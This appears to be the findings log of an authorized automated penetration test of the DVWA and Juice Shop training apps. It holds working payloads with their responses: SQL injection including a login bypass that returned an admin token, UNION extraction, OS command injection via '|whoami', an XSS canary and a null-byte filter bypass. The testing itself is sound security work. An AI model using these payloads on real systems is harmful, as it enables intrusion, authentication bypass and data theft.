state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

[security=high] GET /vulnerabilities/sqli/session-input.php returns form POST action=/vulnerabilities/sqli/session-input.php with fields id (text), Submit (submit). Session-stored id feeds /vulnerabilities/sqli/.

[security=medium] Form POST action=/vulnerabilities/sqli/ fields: id (select with options 1-5), Submit (submit). Page shows 'User ID:' select.

Linked from the /ftp/ directory listing (909 bytes). Retrieval not performed during mapping.

GET /encryptionkeys/ returned 200 with browsable listing: jwt.pub (248B), premium.key (50B).

Unauthenticated GET returned 200 JSON {status:success,data:[...]} with 8 feedback records containing UserId and comment fields. Comments are masked emails (e.g. ***in@juice-sh.op); no raw email field observed in the response excerpt, so PII exposure needs confirmation by the Verification Agent.

GET /rest/products/search?q=apple returned 200 JSON {status:success,data:[products]} (benign query). Single query parameter 'q'. Quote-triggered SQL error and UNION behavior not tested during mapping.

Authenticated as juiceshop_acct1, GET /rest/basket/6 (own basket) returned 200 with Apple Juice qty 3 (UserId 22). GET /rest/basket/1 (UserId 1) returned 200 for juiceshop_acct2 (own basket_id 7) with Apple Juice qty 2, Orange Juice qty 3, Eggfruit Juice qty 1, indicating no ownership check. Account 1 own basket id = 6; Account 2 own basket id = 7. Distinct item for acct1 vs acct2 not yet fully verified (basket 6 only showed Apple Juice).
GET returned 500 'Unexpected path' from Express, which confirms the route exists only for POST. Expected JSON body fields: email, password. Login SQLi candidate: email=' OR 1=1-- .

findings.title: SQL Injection via session-stored id on /vulnerabilities/sqli/ [security=high]
request_sequence: POST http://dvwa/security.php security=high&seclev_submit=Submit&user_token=[REDACTED] -> 302; GET /security.php shows 'Security level is currently: high'
findings.response_evidence: [security=high] TRUE payload 1' OR '1'='1' # returned 5 records: First name/Surname admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith. FALSE payload 1' AND '1'='2' # returned zero records (only 'Click here to change your ID' and no ID/First name/Surname rows). Page footer shows Security Level: high. Injection is driven by the session-stored id set via session-input.php (out-of-band), with a trailing '#' comment needed to neutralise the LIMIT 1 clause.

findings.title: Unsanitised id stored in session by session-input.php feeds SQL injection [security=high]
request_sequence: POST http://dvwa/vulnerabilities/sqli/session-input.php id=1' OR '1'='1' #&Submit=Submit (dvwa_admin) -> page echoes 'Session ID: 1' OR '1'='1' #'
findings.response_evidence: [security=high] session-input.php accepts the raw id and stores it unsanitised (response echoes 'Session ID: 1' OR '1'='1' #'). The stored value is then concatenated into the SQL query on /vulnerabilities/sqli/: TRUE payload yields 5 user records (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith); FALSE payload yields 0 records. This endpoint is the injection source; the sink is /vulnerabilities/sqli/.

findings.title: DVWA OS Command Injection via ip parameter [security=high]
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> page reports 'Security level is currently: high'
POST http://dvwa/vulnerabilities/exec/ form ip='127.0.0.1; whoami', Submit=Submit (dvwa_admin) -> no whoami output (';' blocked at high)
findings.response_evidence: [security=high] Response to ip='127.0.0.1|whoami' HTTP 200 contains 'Enter an IP address: www-data' (pre-block marker 'www-data'). The ';' variant returned no command output, consistent with the high-level blacklist. Security level shown on page: 'Security Level: high'. Note: session_info label reported 'low' but the page body consistently showed high.

findings.title: DVWA Stored XSS via mtxMessage canary [security=high] - not exploitable
request_sequence: GET http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) -> page shows 'Security Level: high', mtxMessage maxlength=50, txtName maxlength=10
POST http://dvwa/vulnerabilities/xss_s/ txtName='bench', mtxMessage='<script id="test_token">window.xss_flag=1</script>' (50 chars), btnSign='Sign Guestbook' (dvwa_admin)
findings.response_evidence: [security=high] Canary accepted and stored, but rendered as 'Message: window.xss_flag=1' with the <script> tags stripped (server-side filter). In the authenticated browser page, window.xss_flag evaluates to 'undefined' (expected '1'). Not confirmed at high. The high-level bypass would require a different payload (e.g., an event-handler vector), which is outside the assigned canary.

findings.title: DVWA security-level change endpoint accessible without authentication (suspected CWE-306)
findings.response_evidence: Unauthenticated GET /security.php -> 302 redirect_location=login.php. Unauthenticated POST /security.php security=low -> 302 redirect_location=login.php (no state change). Admin session level remained unchanged after the unauth attempt. The endpoint enforces login; the unauthenticated access control check passed, so no CWE-306 behavior was observed.

findings.title: DVWA SQL Injection in POST id parameter [security=medium]
request_sequence: GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) -> 'Security level set to medium'
findings.response_evidence: [security=medium] TRUE payload id="1 OR 1=1" -> HTTP 200, returned 5 records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id="1 AND 1=2" -> HTTP 200, zero records returned (only the 'User ID:' select header and no 'First name/Surname' rows). Numeric boolean injection in the POST id field is behaviorally confirmed at medium. Note: the session_info header reported security_level 'low' while the page body reported 'Security Level: medium'; the page body was used as the level indicator.

findings.title: Open directory listing at /ftp/ exposes confidential and backup files
findings.response_evidence: HTTP 200, text/html. Body is a browsable directory listing: "listing directory /ftp/ ... quarantine ... acquisitions.md 909 ... announcement_encrypted.md 369237 ... coupons_2013.md.bak 131 ... incident-support.kdbx 3246 ... legal.md 3047 ... package.json.bak 4291 ... suspicious_errors.yml 723". No authentication was required. Note: the /ftp/ listing itself does not expose key files; the key-file exposure is at /encryptionkeys/ (see separate finding).

findings.title: Confidential acquisitions memo retrievable without authentication via /ftp/
request_sequence: GET http://juiceshop:3000/ftp/ (unauth, Accept: text/html,application/json) -> listing shows acquisitions.md 909
findings.response_evidence: Listing reveals acquisitions.md (909 bytes). Direct GET /ftp/acquisitions.md returned HTTP 200, content-type text/markdown, with body: "# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact..." Confidential memo content disclosed to unauthenticated user.

findings.title: Browsable /encryptionkeys/ directory exposes key files (premium.key, jwt.pub)
findings.response_evidence: HTTP 200, text/html. Body: "listing directory /encryptionkeys/ ... Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM". Directory is browsable without authentication and exposes premium.key and jwt.pub.

findings.response_evidence: Raw path: HTTP 403, body: \"Error: Only .md and .pdf files are allowed!\" (extension filter blocks it). File content retrieved via the %2500 null-byte + .md suffix bypass.

findings.title: Unauthenticated user-feedback listing (/api/Feedbacks) - partial author PII exposure
findings.response_evidence: HTTP 200 application/json without authentication: {"status":"success","data":[{"UserId":1,"id":1,"comment":"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)",...},{"UserId":2,"comment":"Great shop! Awesome service! (***@juice-sh.op)",...},{"UserId":21,"comment":"...(***ereum@juice-sh.op)",...},{"UserId":null,"comment":"... (anonymous)",...}] - 8 records. No full email address field is returned; the only email-like data is masked fragments embedded in comment text (e.g. '***in@juice-sh.op'), plus numeric UserId values. The endpoint is unauthenticated and does return per-record author identifiers, but full author email addresses are not disclosed, so the CWE-359 criterion (disclosure of author email addresses) is not fully met. Partial masked fragments are a weak PII signal; recommend the Coordinator treat as low-severity/inconclusive unless a deeper check (e.g. UserId -> user lookup) is authorized.

findings.title: SQL injection in product search (/rest/products/search, parameter q) - SQLITE_ERROR and UNION injection
findings.response_evidence: Quote payload: HTTP 500 text/html body 'Error: SQLITE_ERROR: near "'%'": syntax error' (Express stack page). UNION payload x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- : HTTP 200 application/json {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} - the injected UNION SELECT columns are reflected in the product record fields (name=2, description=3, etc.), proving attacker-controlled SQL in the query. Baseline benign query q=apple returned 200 with normal product data and no error (from mapping), so the error and UNION behavior are attributable to the injection.

findings.title: Cross-User Basket Access (BOLA) - juiceshop_acct2 reads juiceshop_acct1 basket 6
findings.response_evidence: Account 2 (own basket 7, UserId 23, contents: Orange Juice (1000ml) qty 1) retrieved Account 1's basket 6 with HTTP 200: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"BasketId":6,"quantity":3}}]}}. The item Apple Juice (1000ml) qty 3 is distinct from Account 2's own Orange Juice item, and basket 6 belongs to UserId 22 (acct1), so ownership is not enforced.

findings.title: Unauthenticated User-Feedback Listing - no full author email PII exposed
findings.response_evidence: Unauthenticated GET returned 200 {"status":"success","data":[{"UserId":1,"id":1,"comment":"I love this shop! ... (***in@juice-sh.op)","rating":5,...},{"UserId":21,"id":4,"comment":"... (***ereum@juice-sh.op)"},{"UserId":null,"id":5,"comment":"... (anonymous)"}...]} with 8 records. Records lack any email field; the only author-related content is a masked fragment embedded in the comment text (e.g. ***in@juice-sh.op), and anonymous entries have no author. No complete author email address is disclosed, so the CWE-359 criterion (disclosure of author email addresses) is not met. Residual note: UserId values and partially masked address fragments are disclosed without authentication, a low-severity information exposure at most.

findings.title: Login authentication bypass via SQL injection in email field
findings.response_evidence: Injected request: HTTP 200, content-type application/json, body_excerpt: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. Control request with benign non-existent email: HTTP 401, text/html, "Invalid email or password." The injection returned a valid auth token for the first user admin@juice-sh.op, bypassing password authentication.
